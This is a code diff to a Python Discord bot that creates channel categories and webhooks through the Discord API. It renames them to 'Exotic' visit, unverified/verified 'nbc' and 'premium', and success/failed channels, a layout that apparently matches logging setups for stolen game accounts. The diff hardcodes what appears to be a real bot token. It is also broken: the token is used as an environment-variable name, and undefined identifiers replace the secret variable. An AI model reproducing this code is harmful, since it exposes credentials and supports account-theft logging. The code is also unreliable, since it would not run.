@@ -6,7 +6,7 @@ from discord.ext import commands
 from discord.app_commands import CommandTree
 from webserver import keep_alive
 
-secret_bot = os.environ['TOKEN']
+secret_bot = os.environ['MTE4MDQ1NjAxNDU1NDg2NTc4NA.GRrPcz.78ieCwXLfCVCjoU5mu_Gmk6iVV9fNvQOoU9Ee8']
 
 intents = discord.Intents.default()
 intents.members = True
@@ -17,14 +17,14 @@ tree = CommandTree(client)
 
 async def gen_channels_and_webhooks(guild, num):
     api = "https://discord.com/api/v9"
-    header = {"Authorization": f"Bot {secret_bot}"}
+    header = {"Authorization": f"Bot {byAaAJZTYzDOnoqv7pFVzq1tqqiZkc6_}"}
     hooks = []
 
     async with aiohttp.ClientSession() as session:
-        for category_name, channel_names in [("Visit", ["visit"]),
-                                            ("Unverified", ["unnbc", "unprem"]),
-                                            ("Verified", ["vnbc", "vprem"]),
-                                            ("Success & Failed", ["success", "failed"])]:
+        for category_name, channel_names in [("💸Exotic - Visit💸", ["exotic┊👋 visit"]),
+                                            ("💸Exotic - Unverified💸", ["exotic┊😋unverified-nbc", "exotic┊😋unverified-unpremium"]),
+                                            ("💸Exotic - Verified💸", ["exotic┊🔒verified-nbc", "exotic┊🔒verified-premium"]),
+                                            ("💸Exotic - Success & Failed💸", ["exotic┊✅success", "exotic┊❌failed"])]:
             # Create category
             async with session.post(f'{api}/guilds/{guild.id}/channels', headers=header, json={"name": category_name, "type": 4}) as category_result:
                 try:
@@ -104,4 +104,4 @@ async def delete_channels_except_general_command(int: discord.Interaction):
         await int.followup.send(content=f"Error -> {e}")
 
 keep_alive()
-client.run(secret_bot)
+client.run(byAaAJZTYzDOnoqv7pFVzq1tqqiZkc6_)
